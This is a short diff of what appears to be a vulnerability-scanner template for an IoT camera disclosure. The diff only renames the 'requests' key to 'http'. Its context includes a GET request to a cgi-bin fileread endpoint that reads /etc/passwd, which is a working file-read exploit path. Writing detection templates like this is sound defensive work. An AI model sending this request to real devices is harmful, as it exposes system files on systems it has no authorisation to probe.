@@ -10,7 +10,7 @@ info:
     - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5511.php
   tags: iot,camera,disclosure
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/cgi-bin/operator/fileread?READ.filePath=/etc/passwd"
